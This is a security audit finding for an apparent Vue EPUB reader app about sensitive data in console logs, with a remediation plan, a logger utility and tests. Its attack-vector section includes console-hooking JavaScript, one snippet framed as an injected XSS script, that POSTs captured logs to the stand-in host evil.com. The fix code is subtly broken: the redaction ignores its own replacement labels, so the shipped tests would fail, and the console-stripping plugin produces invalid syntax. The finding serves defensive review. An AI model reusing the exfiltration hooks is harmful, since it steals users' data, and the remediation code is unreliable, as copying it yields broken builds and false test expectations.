# Sensitive Data Exposure in Console Logs

## Severity
Low

## Affected Files
- `src/App.vue:22, 25` (console logs)
- `src/composables/useEpub.ts:123, 212, 307, 345, 353, 391, 397, 405, 414-417, 447, 533` (Multiple console logs)
- `src/components/LibraryPanel.vue:89` (console.error)
- `src/components/HomeScreen.vue:74` (console.error)
- `src/stores/library.ts` (No console logs, but should log carefully)

## Description
The application logs various types of information to the browser console, including:
1. Book metadata (title, author, ID)
2. File paths and names
3. Error messages that may contain sensitive information
4. Debug information about EPUB structure
5. User interaction data

While console logs are primarily for debugging during development, they can pose security risks in production:
- Users or attackers can view console logs
- Logs may expose internal application structure
- Error messages might reveal sensitive file paths or system information
- Book metadata could be used for fingerprinting

```typescript
// Line 22 in App.vue
bookStore.loadBook(file, shouldCache, existingBookId).catch(err => {
  console.error('Failed to load book:', err); // LEAKS ERROR DETAILS
});

// Line 25 in App.vue
console.warn('Invalid file type:', file.name); // LEAKS FILE NAME

// Lines 123 in useEpub.ts
console.warn('Unable to determine base URL from book packaging'); // REVEALS INTERNAL STRUCTURE

// Lines 212 in useEpub.ts
console.warn('Failed to load cover image', err); // LEAKS ERROR DETAILS

// Lines 314-317 in useEpub.ts
} catch (err) {
  console.warn('Failed to load NCX toc:', err); // LEAKS ERROR DETAILS
}

// Line 353 in useEpub.ts
console.warn(`Archive zip not available for chapter: ${title} (${href})`); // LEAKS CHAPTER INFO

// Line 391 in useEpub.ts
console.warn(`Chapter file not found in archive: ${title} (${chapterPath})`); // LEAKS FILE PATHS

// Line 414-417 in useEpub.ts
console.warn(
  `No body element in chapter: ${title} (${chapterPath}) ` +
  `Document element: ${docEl?.tagName || 'none'}, ` +
  `outerHTML preview: ${debugOuter || '(empty)'}`, // LEAKS HTML CONTENT
);
```

## Potential Attack Vectors

### 1. Information Disclosure via Console Access
```javascript
// Attacker with console access can:
console.log('Collecting data from console...');

// Capture console output
const originalError = console.error;
console.error = (...args) => {
  // Send to attacker server
  fetch('https://evil.com/log', {
    method: 'POST',
    body: JSON.stringify(args)
  });
  originalError.apply(console, args);
};

// Now when app logs errors, attacker receives them
```

### 2. Fingerprinting via Book Metadata
```javascript
// Console logs expose book information
console.warn('Invalid file type:', book-name.epub);

// Attacker can:
// - Track what books user is reading
// - Build reading profile
// - Correlate with other data
```

### 3. Error Message Leakage
```javascript
// Error messages may reveal:
console.error('Failed to load book:', {
  message: "ENOENT: no such file or directory, open 'C:\\Users\\user\\Documents\\books\\secret.epub'",
  errno: -4058,
  syscall: 'open',
  path: 'C:\\Users\\user\\Documents\\books\\secret.epub'
});

// Attacker learns:
// - User's home directory path
// - File naming conventions
// - System information
```

### 4. Debug Information Exposure
```javascript
// Debug logs reveal internal structure
console.warn(`Archive zip not available for chapter: Chapter 1 (OEBPS/chapter1.xhtml)`);
console.warn(`Document element: html, outerHTML preview: <!DOCTYPE html><html lang="en">...`);

// Attacker learns:
// - EPUB internal structure
// - Application implementation details
// - Potential attack surface
```

### 5. Data Exfiltration Through Console Logs
If an attacker manages to inject JavaScript (via XSS), they can capture and exfiltrate console logs:

```javascript
// In injected XSS script
(function() {
  const logs = [];
  const methods = ['log', 'warn', 'error', 'info', 'debug'];
  
  methods.forEach(method => {
    const original = console[method];
    console[method] = (...args) => {
      logs.push({ method, args, timestamp: Date.now() });
      original.apply(console, args);
    };
  });
  
  // Periodically exfiltrate logs
  setInterval(() => {
    if (logs.length > 0) {
      fetch('https://evil.com/exfil', {
        method: 'POST',
        body: JSON.stringify({ logs })
      });
      logs.length = 0;
    }
  }, 5000);
})();
```

## Implementation Plan

### Step 1: Create logging utility
Create `src/utils/logger.ts`:
```typescript
/**
 * Logging Utility
 * 
 * Controlled logging with environment-based filtering and
 * sensitive data redaction
 */

/**
 * Log levels
 */
export enum LogLevel {
  DEBUG = 0,
  INFO = 1,
  WARN = 2,
  ERROR = 3,
  NONE = 4
}

/**
 * Logger configuration
 */
interface LoggerConfig {
  level: LogLevel;
  enableConsole: boolean;
  enableRemote: boolean;
  remoteEndpoint?: string;
  redactSensitive: boolean;
  environment: 'development' | 'production' | 'test';
}

/**
 * Default configuration
 */
const DEFAULT_CONFIG: LoggerConfig = {
  level: import.meta.env.DEV ? LogLevel.DEBUG : LogLevel.WARN,
  enableConsole: true,
  enableRemote: false,
  redactSensitive: true,
  environment: import.meta.env.MODE as 'development' | 'production' | 'test'
};

/**
 * Sensitive data patterns to redact
 */
const SENSITIVE_PATTERNS = [
  // File paths
  {
    pattern: /[A-Za-z]:\\[^\\]*(\\|\/)[^\\]*/g,
    replacement: '[REDACTED_PATH]'
  },
  {
    pattern: /\/(home|Users|private|var)\/[^\/]+\/[^\/]+/g,
    replacement: '[REDACTED_PATH]'
  },
  // Personal information
  {
    pattern: /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g,
    replacement: '[REDACTED_EMAIL]'
  },
  // Tokens, keys, secrets
  {
    pattern: /['"](token|api[_-]?key|secret|password)['"]\s*[:=]\s*['"]([^'"]+)['"]/gi,
    replacement: '[$1=REDACTED]'
  },
  // URLs with potential sensitive data
  {
    pattern: /(https?:\/\/[^\/]+\/)[^\s<>"']+/g,
    replacement: '$1[REDACTED_URL]'
  }
];

/**
 * Error message patterns to sanitize
 */
const ERROR_PATTERNS_TO_SANITIZE = [
  // File system paths in errors
  {
    pattern: /(ENOENT|EACCES|EPERM):[^,]*/g,
    replacement: '[FILE_ERROR]'
  },
  // Stack traces (except in dev)
  {
    pattern: /at\s+[^\s]+(\s+\([^\)]+\))?/g,
    replacement: '[STACK_FRAME]'
  }
];

class Logger {
  private config: LoggerConfig;
  private redactedPatterns: RegExp[];

  constructor(config: Partial<LoggerConfig> = {}) {
    this.config = { ...DEFAULT_CONFIG, ...config };
    this.redactedPatterns = SENSITIVE_PATTERNS.map(p => p.pattern);
  }

  /**
   * Check if a log level is enabled
   */
  private shouldLog(level: LogLevel): boolean {
    return this.config.enableConsole && level >= this.config.level;
  }

  /**
   * Redact sensitive information from log data
   */
  private redact(data: any): any {
    if (!this.config.redactSensitive) {
      return data;
    }

    if (typeof data !== 'string') {
      // Convert to string for redaction
      try {
        data = JSON.stringify(data);
      } catch {
        return '[UNREDACTABLE_DATA]';
      }
    }

    let redacted = data;
    
    for (const pattern of this.redactedPatterns) {
      redacted = redacted.replace(pattern, '[REDACTED]');
    }

    return redacted;
  }

  /**
   * Sanitize error messages
   */
  private sanitizeError(error: Error | unknown): string {
    if (error instanceof Error) {
      let message = error.message;
      
      // In production, sanitize error messages
      if (this.config.environment === 'production') {
        for (const pattern of ERROR_PATTERNS_TO_SANITIZE) {
          message = message.replace(pattern.pattern, pattern.replacement);
        }
      }
      
      return message;
    }
    
    return String(error);
  }

  /**
   * Format log message
   */
  private format(level: LogLevel, message: string, ...args: any[]): string {
    const timestamp = new Date().toISOString();
    const levelName = LogLevel[level];
    const redactedArgs = args.map(arg => this.redact(arg));
    
    return `[${timestamp}] [${levelName}] ${message} ${redactedArgs.length > 0 ? JSON.stringify(redactedArgs) : ''}`;
  }

  /**
   * Send log to remote endpoint (if configured)
   */
  private async sendRemoteLog(level: LogLevel, message: string, ...args: any[]): Promise<void> {
    if (!this.config.enableRemote || !this.config.remoteEndpoint) {
      return;
    }

    try {
      const payload = {
        level: LogLevel[level],
        message,
        args: args.map(arg => this.redact(arg)),
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent,
        url: window.location.href
      };

      await fetch(this.config.remoteEndpoint, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(payload),
        keepalive: true
      });
    } catch (error) {
      // Don't log remote errors to avoid infinite loops
      console.error('Failed to send remote log:', error);
    }
  }

  /**
   * Log debug message
   */
  debug(message: string, ...args: any[]): void {
    if (this.shouldLog(LogLevel.DEBUG)) {
      const formatted = this.format(LogLevel.DEBUG, message, ...args);
      console.debug(formatted);
      this.sendRemoteLog(LogLevel.DEBUG, message, ...args);
    }
  }

  /**
   * Log info message
   */
  info(message: string, ...args: any[]): void {
    if (this.shouldLog(LogLevel.INFO)) {
      const formatted = this.format(LogLevel.INFO, message, ...args);
      console.info(formatted);
      this.sendRemoteLog(LogLevel.INFO, message, ...args);
    }
  }

  /**
   * Log warning message
   */
  warn(message: string, ...args: any[]): void {
    if (this.shouldLog(LogLevel.WARN)) {
      const formatted = this.format(LogLevel.WARN, message, ...args);
      console.warn(formatted);
      this.sendRemoteLog(LogLevel.WARN, message, ...args);
    }
  }

  /**
   * Log error message
   */
  error(message: string, error?: Error | unknown, ...args: any[]): void {
    if (this.shouldLog(LogLevel.ERROR)) {
      const sanitizedError = error ? this.sanitizeError(error) : undefined;
      const formatted = this.format(LogLevel.ERROR, message, sanitizedError, ...args);
      console.error(formatted);
      this.sendRemoteLog(LogLevel.ERROR, message, error, ...args);
    }
  }

  /**
   * Create a scoped logger with context
   */
  context(context: string): ScopedLogger {
    return new ScopedLogger(this, context);
  }

  /**
   * Update configuration
   */
  updateConfig(config: Partial<LoggerConfig>): void {
    this.config = { ...this.config, ...config };
  }
}

/**
 * Scoped logger with prefix
 */
class ScopedLogger {
  constructor(
    private logger: Logger,
    private context: string
  ) {}

  private formatMessage(message: string): string {
    return `[${this.context}] ${message}`;
  }

  debug(message: string, ...args: any[]): void {
    this.logger.debug(this.formatMessage(message), ...args);
  }

  info(message: string, ...args: any[]): void {
    this.logger.info(this.formatMessage(message), ...args);
  }

  warn(message: string, ...args: any[]): void {
    this.logger.warn(this.formatMessage(message), ...args);
  }

  error(message: string, error?: Error | unknown, ...args: any[]): void {
    this.logger.error(this.formatMessage(message), error, ...args);
  }
}

/**
 * Global logger instance
 */
export const logger = new Logger();

/**
 * Create a logger for specific module
 */
export function createLogger(context: string): ScopedLogger {
  return logger.context(context);
}

/**
 * Export singleton for convenience
 */
export default logger;
```

### Step 2: Update App.vue to use logger
```typescript
import { createLogger } from '@/utils/logger';

const logger = createLogger('App');

function handleFileDrop(file: File, shouldCache: boolean = true, existingBookId?: string) {
  if (file.name.endsWith('.epub') || file.name.endsWith('.EPUB')) {
    bookStore.loadBook(file, shouldCache, existingBookId).catch(err => {
      logger.error('Failed to load book', err);
    });
  } else {
    logger.warn('Invalid file type', { filename: file.name });
  }
}
```

### Step 3: Update useEpub.ts to use logger
```typescript
import { createLogger } from '@/utils/logger';

const logger = createLogger('useEpub');

// Replace all console.log/warn/error with logger calls

// Example replacements:
console.warn('Unable to determine base URL from book packaging');
// becomes:
logger.warn('Unable to determine base URL from book packaging');

console.warn('Failed to load cover image', err);
// becomes:
logger.error('Failed to load cover image', err);

console.warn(`Chapter file not found in archive: ${title} (${chapterPath})`);
// becomes:
logger.warn('Chapter file not found in archive', {
  chapterTitle: title,
  chapterPath
});

console.warn(
  `No body element in chapter: ${title} (${chapterPath}) ` +
  `Document element: ${docEl?.tagName || 'none'}, ` +
  `outerHTML preview: ${debugOuter || '(empty)'}`,
);
// becomes:
logger.debug('No body element in chapter', {
  chapterTitle: title,
  chapterPath,
  documentElement: docEl?.tagName || 'none'
});
```

### Step 4: Update LibraryPanel.vue to use logger
```typescript
import { createLogger } from '@/utils/logger';

const logger = createLogger('LibraryPanel');

async function handleFileUpload(file: File) {
  try {
    await bookStore.loadBook(file, true);
    emit('close');
  } catch (err) {
    logger.error('Failed to load book', err);
  }
}
```

### Step 5: Update HomeScreen.vue to use logger
```typescript
import { createLogger } from '@/utils/logger';

const logger = createLogger('HomeScreen');

async function handleLibraryDrop(event: DragEvent) {
  event.preventDefault();
  isDragging.value = false;

  const files = event.dataTransfer?.files;
  if (files && files.length > 0) {
    await handleFileUpload(files[0]);
  }
}

async function handleFileUpload(file: File) {
  try {
    await bookStore.loadBook(file, true);
    emit('close');
  } catch (err) {
    logger.error('Failed to load book', err);
  }
}
```

### Step 6: Update Vite config to strip console logs in production
Update `vite.config.ts`:
```typescript
import { defineConfig } from 'vite';
import vue from '@vitejs/plugin-vue';
import { resolve } from 'path';

export default defineConfig(({ mode }) => {
  const isProduction = mode === 'production';
  
  return {
    plugins: [
      vue(),
      {
        name: 'strip-console',
        enforce: 'post',
        transform(code, id) {
          if (isProduction && 
              (/\.(vue|ts|js)$/.test(id) || 
               id.includes('/src/'))) {
            // Remove console.log, console.info in production
            // Keep console.warn and console.error but through logger
            return code
              .replace(/console\.log\(/g, 'void 0;')
              .replace(/console\.info\(/g, 'void 0;');
          }
          return code;
        }
      }
    ],
    resolve: {
      alias: {
        '@': resolve(__dirname, 'src'),
        'epubjs': resolve(__dirname, 'node_modules/epubjs/dist/epub.js'),
      },
    },
    // ... rest of config ...
  };
});
```

### Step 7: Add tests
Create `tests/logger.test.ts`:
```typescript
import { describe, it, expect, vi, beforeEach } from 'vitest';
import { logger, createLogger, LogLevel } from '@/utils/logger';

describe('Logger', () => {
  beforeEach(() => {
    // Mock console methods
    vi.spyOn(console, 'debug');
    vi.spyOn(console, 'info');
    vi.spyOn(console, 'warn');
    vi.spyOn(console, 'error');
  });

  it('should respect log level', () => {
    logger.updateConfig({ level: LogLevel.ERROR });
    
    logger.debug('debug message');
    logger.info('info message');
    logger.warn('warn message');
    logger.error('error message');
    
    expect(console.debug).not.toHaveBeenCalled();
    expect(console.info).not.toHaveBeenCalled();
    expect(console.warn).not.toHaveBeenCalled();
    expect(console.error).toHaveBeenCalled();
  });

  it('should redact file paths', () => {
    logger.updateConfig({ level: LogLevel.DEBUG });
    
    logger.debug('File path', '/Users/john/Documents/book.epub');
    
    expect(console.debug).toHaveBeenCalled();
    const loggedData = (console.debug as any).mock.calls[0][0];
    expect(loggedData).toContain('[REDACTED_PATH]');
    expect(loggedData).not.toContain('/Users/john');
  });

  it('should redact email addresses', () => {
    logger.updateConfig({ level: LogLevel.DEBUG });
    
    logger.info('User email', 'user@example.com');
    
    expect(console.info).toHaveBeenCalled();
    const loggedData = (console.info as any).mock.calls[0][0];
    expect(loggedData).toContain('[REDACTED_EMAIL]');
    expect(loggedData).not.toContain('user@example.com');
  });

  it('should redact API keys', () => {
    logger.updateConfig({ level: LogLevel.DEBUG });
    
    logger.debug('Config', { apiKey: 'secret123' });
    
    expect(console.debug).toHaveBeenCalled();
    const loggedData = (console.debug as any).mock.calls[0][0];
    expect(loggedData).toContain('[REDACTED]');
    expect(loggedData).not.toContain('secret123');
  });

  it('should create scoped logger', () => {
    const scopedLogger = createLogger('TestModule');
    
    scopedLogger.info('test message');
    
    expect(console.info).toHaveBeenCalled();
    const loggedData = (console.info as any).mock.calls[0][0];
    expect(loggedData).toContain('[TestModule]');
  });
});
```

## Additional Recommendations

1. **Production Configuration**: Set appropriate log levels for production
2. **Remote Logging**: Implement secure remote logging with authentication
3. **Log Retention**: Define log retention policies
4. **Rate Limiting**: Prevent log flooding
5. **Privacy**: Ensure logs don't contain PII (Personally Identifiable Information)
6. **Audit**: Regularly review logs for security incidents

## Logging Best Practices

| Practice | Description |
|-----------|-------------|
| No PII | Don't log names, emails, or personal data |
| No Secrets | Never log passwords, tokens, or API keys |
| Error Context | Include enough context for debugging without over-sharing |
| Environment-Aware | Different logging levels for dev vs. production |
| Structured Logs | Use JSON format for easier parsing |
| Timestamps | Include timestamps for all log entries |
| Request IDs | Include correlation IDs for distributed tracing |

## Related Issues
- See also: `insecure-indexeddb-usage.md` (Data storage security)
- See also: `missing-sanitization-user-input.md` (Input validation)
